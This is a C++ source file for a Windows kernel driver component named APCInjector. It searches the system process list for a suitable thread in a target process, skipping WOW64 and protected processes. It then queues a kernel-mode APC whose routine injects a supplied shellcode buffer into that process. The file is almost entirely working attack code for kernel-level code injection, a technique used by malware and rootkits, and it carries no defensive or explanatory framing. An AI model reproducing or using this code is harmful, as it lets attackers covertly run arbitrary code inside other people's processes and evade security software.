#include "../../lib/Memory.h"
#include "../../lib/Symbols.h"
#include "APCInjector.h"

APCInjector::APCInjector(Process& process, NonPagedBuffer& shellcode)
	: m_process(process)
	, m_shellcode(shellcode)
{}

NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
    auto status = STATUS_SUCCESS;
    const auto processInformation = std::make_unique<SYSTEM_PROCESS_INFO, PagedPool, POOL_TAG>();
    const auto isWow64 = PsGetProcessWow64Process(m_process.get()) != NULL;

    ULONG bytesToAllocate;
    status = ZwQuerySystemInformation(SystemProcessInformation, nullptr, NULL, &bytesToAllocate);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = ZwQuerySystemInformation(SystemProcessInformation, processInformation.get(), bytesToAllocate, NULL);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = STATUS_NOT_FOUND;
    for (auto entry = processInformation.get(); entry->NextEntryOffset != NULL; entry = reinterpret_cast<PSYSTEM_PROCESS_INFO>((reinterpret_cast<PUCHAR>(entry) + entry->NextEntryOffset))) {
        if (entry->UniqueProcessId == m_process.getPid()){
            for (size_t i = 0; i < entry->NumberOfThreads; i++)
            {
                if (entry->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId()) {
                    continue;
                }

                *tid = HandleToUlong(entry->Threads[i].ClientId.UniqueThread);

                if (*tid){
                    if (isWow64 || PsIsProtectedProcess(m_process.get())){
                        *tid = 0;
                        continue;
                    }
                    return STATUS_SUCCESS;
                }
            }
        }
    }

    return status;
}

NTSTATUS APCInjector::inject() {
    ULONG threadId = 0;
    const auto status = findInjectableThread(&threadId);

    if (!NT_SUCCESS(status)) {
        return status;
    }

    auto thread = Thread(threadId);

    auto apc = std::make_unique<KAPC, NonPagedPool, POOL_TAG>();
    if (!apc.get()) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    ApcHandler::KeInitializeApc(
        apc.get(),
        thread.get(),
        ApcHandler::OriginalApcEnvironment,
        &ApcHandler::kernelFreeKapc,
        &ApcHandler::rundownFreeKapc,
        &ApcHandler::normalInjectCode,
        KernelMode,
        nullptr
    );

    if (::ExAcquireRundownProtection(&ApcHandler::g_rundown_protection)) {
        auto inserted = ApcHandler::KeInsertQueueApc(
            apc.get(),
            nullptr,
            nullptr,
            0
        );

        if (!inserted) {
            ::ExReleaseRundownProtection(&ApcHandler::g_rundown_protection);

            KdPrint(("[-] Could not insert a kernel APC.\n"));
            return STATUS_INTERNAL_ERROR;
        }
    }

	return status;
}